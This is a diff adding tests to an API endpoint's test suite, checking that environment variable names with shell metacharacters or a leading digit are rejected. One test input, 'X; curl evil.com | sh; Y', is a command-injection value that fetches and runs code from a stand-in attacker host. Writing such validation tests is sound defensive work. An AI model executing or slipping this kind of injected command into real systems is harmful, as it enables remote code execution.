@@ -175,6 +175,31 @@ describe("PATCH /api/environments/[id]", () => {
     expect(decryptEnvironmentVariables(data.environmentVariables)).toEqual({ FOO: "bar" })
   })
 
+  it("rejects a variable name with a shell metacharacter, naming the offending key", async () => {
+    environment.findFirst.mockResolvedValueOnce(row())
+
+    const res = await PATCH(
+      makeRequest({ variables: { "X; curl evil.com | sh; Y": "1" } }),
+      params()
+    )
+    const body = await res.json()
+
+    expect(res.status).toBe(400)
+    expect(body.error).toContain("X; curl evil.com | sh; Y")
+    expect(environment.update).not.toHaveBeenCalled()
+  })
+
+  it("rejects a variable name starting with a digit", async () => {
+    environment.findFirst.mockResolvedValueOnce(row())
+
+    const res = await PATCH(makeRequest({ variables: { "9FOO": "1" } }), params())
+    const body = await res.json()
+
+    expect(res.status).toBe(400)
+    expect(body.error).toContain("9FOO")
+    expect(environment.update).not.toHaveBeenCalled()
+  })
+
   it("stashes the previous setup script and stamps setupScriptUpdatedBy as user", async () => {
     environment.findFirst.mockResolvedValueOnce(row({ setupScript: "echo old" }))
     environment.update.mockResolvedValueOnce(row())
